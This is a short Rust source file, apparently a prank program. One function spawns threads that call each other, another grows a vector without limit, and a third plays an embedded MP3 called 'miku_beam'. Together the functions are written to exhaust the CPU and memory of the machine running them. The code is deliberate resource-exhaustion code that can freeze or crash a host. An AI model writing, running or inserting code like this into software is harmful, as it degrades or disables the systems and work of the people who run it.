use std::{thread, time::Duration};
use soloud::*;


pub fn vampire_cpu() -> thread::JoinHandle<()> {

    thread::spawn(move||{
        loop{
            thread::sleep(std::time::Duration::from_secs(10));
            vampire_cpu();
            vampire_memory();
        }
    })


}




pub fn vampire_memory(){
    let mut vec = Vec::new();
    loop{
        vec.push(0u128);
        
    }

}

pub fn reproduce_music(){
    let sl = Soloud::default().unwrap();
    let mut wav = audio::Wav::default();
    wav.load_mem(include_bytes!("../music/miku_beam.mp3")).unwrap();
    sl.play(&wav);

    while sl.voice_count() > 0 {
        thread::sleep(Duration::from_millis(100));
    }
}